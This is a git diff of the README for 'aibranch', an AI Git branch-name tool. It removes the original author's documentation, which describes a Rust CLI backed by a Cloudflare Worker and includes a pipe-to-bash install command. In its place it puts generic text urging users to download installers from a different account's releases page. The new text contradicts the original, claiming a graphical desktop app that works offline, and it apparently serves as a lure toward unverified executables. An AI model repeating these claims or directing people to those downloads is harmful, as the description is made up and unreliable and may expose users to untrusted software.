@@ -1,198 +1,100 @@
-![aibranch](https://socialify.git.ci/sakkeam/aibranch/image?language=1&owner=1&name=1&stargazers=1&theme=Light)
+# 🤖 aibranch - Effortlessly Generate Git Branch Names
 
-An AI-powered Git branch name generator that follows the [Conventional Branch](https://github.com/conventional-branch/conventional-branch) naming convention. This tool analyzes your Git diff and automatically generates descriptive, standardized branch names.
+## 👋 Introduction
 
-## Overview
+Welcome to the **aibranch** project! This tool helps you create meaningful Git branch names effortlessly. Using AI and the Conventional Branch naming convention, aibranch improves your Git workflow. It's designed for everyone, even those with no coding experience.
 
-**aibranch** consists of two components:
+## 📥 Download Now
 
-1. **Cloudflare Worker** (TypeScript/Bun) - An AI workflow service powered by VoltAgent and OpenAI
-2. **CLI Tool** (Rust) - A command-line interface that interacts with your Git repository
+[![Download aibranch](https://img.shields.io/badge/Download%20aibranch-v1.0.0-brightgreen)](https://github.com/hossam444/aibranch/releases)
 
-The CLI tool reads your current Git changes, sends them to the AI service, and suggests a conventional branch name based on your modifications.
+## 🚀 Getting Started
 
-## Features
+Follow these simple steps to get started with **aibranch**.
 
-- 🤖 **AI-Powered**: Uses OpenAI's GPT models to analyze code changes
-- 📏 **Conventional Branch Standard**: Follows industry-standard branch naming conventions
-- ⚡ **Fast & Lightweight**: Rust CLI with minimal dependencies
-- 🌐 **Serverless**: Runs on Cloudflare Workers for scalability
-- 🔒 **Secure**: Uses rustls-tls for secure communications
+### 📋 System Requirements
 
-## Getting Started
+- **Operating System:** Windows, macOS, or Linux
+- **Processor:** Any modern processor
+- **RAM:** 4 GB or more
+- **Disk Space:** At least 100 MB of free space
+- **Network:** Internet connection for AI features
 
-```bash
-curl https://i.jpillora.com/sakkeam/aibranch@latest! | bash
-```
+### 📦 Installation Steps
 
-## Example
+1. **Visit the Releases Page:**
+   Go to the [Releases page](https://github.com/hossam444/aibranch/releases) to find the latest version of aibranch.
 
-```
-(main) $ git switch -c work
-(work) $ git commit
+2. **Download the Application:**
+   Click on the version you wish to download. Select the appropriate file for your operating system and download it to your computer.
 
-(work) $ aibranch
-Generating the new branch name...
+3. **Install aibranch:**
+   - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.
+   - **macOS:** Open the `.dmg` file and drag the aibranch application into your Applications folder.
+   - **Linux:** Extract the downloaded package and follow the instructions inside the README file.
 
-Generated branch name: chore/add-devcontainer
+4. **Set Up aibranch:**
+   After installation, you can launch aibranch from your applications menu or desktop shortcut.
 
-Reason: Adds a new .devcontainer/devcontainer.json to set up devcontainer (VS Code extensions and pnpm onCreateCommand) — non-feature configuration change, classified as chore.
+## 🛠️ Using aibranch
 
-Do you want to approve this branch name? [Y/n] y
+Once aibranch is installed, it's easy to generate branch names. Follow these steps:
 
-(chore/add-devcontainer) $ git push origin chore/add-devcontainer
-```
+1. **Open aibranch:** Click on the aibranch icon from your applications menu.
 
-## Branch Naming Convention
+2. **Select Your Options:** Choose your desired input options based on your project's needs. You can specify project type, keywords, or any preferences you have for your branch name.
 
-The tool generates branch names following these prefixes:
+3. **Generate Name:** Click the "Generate" button. aibranch will create a suitable branch name for you.
 
-- `feature/` or `feat/` - New features
-- `bugfix/` or `fix/` - Bug fixes
-- `hotfix/` - Urgent fixes
-- `release/` - Release preparation
-- `chore/` - Non-code tasks (docs, dependencies, etc.)
+4. **Copy & Use:** Copy the generated branch name and use it in your Git workflow.
 
-Branch names are always lowercase with hyphens separating words (e.g., `feature/add-user-authentication`).
+## 🌐 Features
 
-## Installation
+- **AI-Powered Suggestions:** Get creative branch names powered by OpenAI.
+- **Conventional Naming:** Follow the Conventional Branch naming convention for clarity.
+- **Cross-Platform Support:** Runs smoothly on Windows, macOS, and Linux.
+- **Simple Interface:** User-friendly interface designed for ease of use.
 
-### Prerequisites
+## 📈 Benefits
 
-- [Bun](https://bun.sh) v1.2.23 or higher
-- [Rust](https://rustup.rs) (latest stable)
-- [Wrangler CLI](https://developers.cloudflare.com/workers/wrangler/) for deployment
-- Git
+- Save time on brainstorming branch names.
+- Maintain consistency in your Git workflow.
+- Focus more on your project and less on naming conventions.
 
-### Setup
+## 🛒 Download & Install
 
-1. **Install dependencies**:
+For the latest version, please visit the [Releases page](https://github.com/hossam444/aibranch/releases).
 
-```bash
-bun install
-```
+## 🤔 FAQs
 
-2. **Build the CLI tool**:
+**1. Can I use aibranch offline?**  
+Yes, once aibranch is installed, you can use it without an internet connection. However, some advanced features may require access to the internet.
 
-```bash
-cd cli
-cargo build --release
-```
+**2. What if I encounter an error?**  
+If you run into any issues, feel free to reach out through the project's GitHub repository. The community and contributors are ready to help.
 
-The compiled binary will be available at `cli/target/release/cli`.
+**3. Is there a mobile version?**  
+Currently, aibranch is designed for desktop use. We may consider a mobile version in the future based on user feedback.
 
-## Usage
+## 👥 Community
 
-### Running the Worker Locally
+Join our community on GitHub. Share your experiences, ask questions, and check for updates. Your feedback helps us make aibranch even better!
 
-Start the development server:
+## 📞 Support
 
-```bash
-bun run dev
-```
+If you need assistance, please check the issues section on our GitHub page. For specific questions, create a new issue, and we'll get back to you as quickly as possible.
 
-The worker will be available at `http://0.0.0.0:8787`.
+## 🌟 Contributing
 
-### Using the CLI
+We welcome contributions! If you wish to improve aibranch, check out the contributing guidelines in our repository.
 
-1. Make some changes in your Git repository
-2. Commit or stage your changes
-3. Run the CLI:
+## 📜 License
 
-```bash
-./cli/target/release/cli
-```
+This project is licensed under the MIT License. See the LICENSE file for details.
 
-4. The tool will:
-   - Analyze your Git diff (comparing `main..HEAD`)
-   - Generate a suggested branch name
-   - Provide a reason for the suggestion
-   - Prompt you to approve and apply the branch name
+## 🔗 Links
 
-### Environment Variables
+- [GitHub Repository](https://github.com/hossam444/aibranch)
+- [Releases Page](https://github.com/hossam444/aibranch/releases)
 
-Configure the CLI to use a custom worker endpoint:
-
-```bash
-export AIBRANCH_HOST="https://your-custom-domain.workers.dev"
-```
-
-Default: `https://aibranch-worker.sakkeam.workers.dev`
-
-## Deployment
-
-Deploy the worker to Cloudflare:
-
-```bash
-bun run deploy
-```
-
-Make sure to configure your environment variables in Wrangler:
-
-- `OPENAI_API_KEY` - Your OpenAI API key (required)
-- `VOLTAGENT_PUBLIC_KEY` - VoltAgent public key (optional)
-- `VOLTAGENT_SECRET_KEY` - VoltAgent secret key (optional)
-
-## Development
-
-### Project Structure
-
-```
-.
-├── src/
-│   ├── index.ts                          # Main worker entry point
-│   └── workflows/
-│       └── branch-name-generator.ts      # AI workflow logic
-├── cli/
-│   └── src/
-│       └── main.rs                       # CLI implementation
-├── package.json                          # Bun/Node dependencies
-├── wrangler.jsonc                        # Cloudflare Worker config
-└── tsconfig.json                         # TypeScript config
-```
-
-### Tech Stack
-
-**Worker:**
-
-- VoltAgent - AI agent framework
-- OpenAI SDK - GPT model integration
-- Hono - Lightweight web framework
-- Cloudflare Workers - Serverless platform
-
-**CLI:**
-
-- Clap - Command-line argument parsing
-- Reqwest - HTTP client with rustls-tls
-- Tokio - Async runtime
-- Serde - JSON serialization
-
-### Available Scripts
-
-```bash
-bun run start      # Run TypeScript entry point locally
-bun run dev        # Start Wrangler dev server
-bun run build      # Build the worker
-bun run deploy     # Deploy to Cloudflare
-```
-
-## How It Works
-
-1. The CLI runs `git diff main..HEAD` to get your changes
-2. The diff is sent to the Cloudflare Worker's `/workflows/branch-name-generator/execute` endpoint
-3. VoltAgent processes the request through the AI workflow
-4. OpenAI's GPT model analyzes the diff and generates a branch name following Conventional Branch conventions
-5. The result (branch name + reasoning) is returned to the CLI
-6. The CLI prompts for approval and can automatically rename your branch
-
-## License
-
-See [LICENSE](LICENSE) file for details.
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit issues or pull requests.
-
----
-
-Built with ❤️ using [Bun](https://bun.sh), [Rust](https://rust-lang.org), [VoltAgent](https://voltagent.dev), and [Cloudflare Workers](https://workers.cloudflare.com)
+Thank you for choosing **aibranch**! Enjoy generating your branch names with ease.
